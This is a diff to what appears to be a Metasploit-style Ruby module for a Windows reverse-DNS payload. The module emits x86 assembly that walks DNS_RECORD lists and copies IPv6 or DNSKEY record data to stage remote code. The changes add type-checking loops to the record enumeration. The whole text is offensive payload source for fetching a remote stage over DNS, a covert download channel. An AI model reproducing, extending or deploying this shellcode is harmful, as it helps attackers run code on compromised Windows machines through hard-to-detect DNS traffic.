@@ -269,10 +269,14 @@ module Payload::Windows::ReverseDns
          push        eax
          mov         esi, esp              ; pointer to DNS_RECORD
          mov         [esi], eax            ; ESI < -pointer to DNS_RECORD
+      next_iph:
          mov         ebx, [esi]            ; EBX < -current pointer
          mov         edx, [ebx]
          mov         [esi], edx            ; save Next IP
          mov         edx, ebx
+         movzx       eax, word ptr [edx + 8]
+         cmp         eax, #{request_type}
+         jne         next_iph 
     ^
     
     if req_type == "IPv6" # IPv6 
@@ -362,18 +366,23 @@ module Payload::Windows::ReverseDns
          push        eax                  ; ESI <-pointer to DNS_RECORD
          mov         eax, [esp + 0x20]
          push        eax                 ; save current offset
- 
-    ^    
-    
-    if req_type == "IPv6"     #IPv6
-      asm << %Q^
-
+         
+         
       ip_enum:
          mov         eax, [esp+4]            
          test        eax, eax
          je          copy_end
          mov         ebx, [eax]          ; EBX <-current pointer
          mov         [esp + 4], ebx      ; save Next IP
+         
+         movzx       edx, word ptr [eax + 8]   
+         cmp         edx, #{request_type}
+         jne         ip_enum
+
+    ^    
+    
+    if req_type == "IPv6"     #IPv6
+      asm << %Q^
          mov         edx, eax
          add         edx, 0x18           ; EDX <-IP pointer
          xor         eax, eax
@@ -416,10 +425,7 @@ module Payload::Windows::ReverseDns
          jmp         ip_enum
       ^
     else # DNSKKEY
-      asm << %Q^ 
-        mov         eax, [esp+4]                ; EAX <-current pointer          
-        test        eax, eax
-        je          copy_end       
+      asm << %Q^      
         mov         ecx, dword ptr ds:[eax + 0x1c]  ; ECX <- current size
         test        ecx, ecx 
         je          parse_end_db
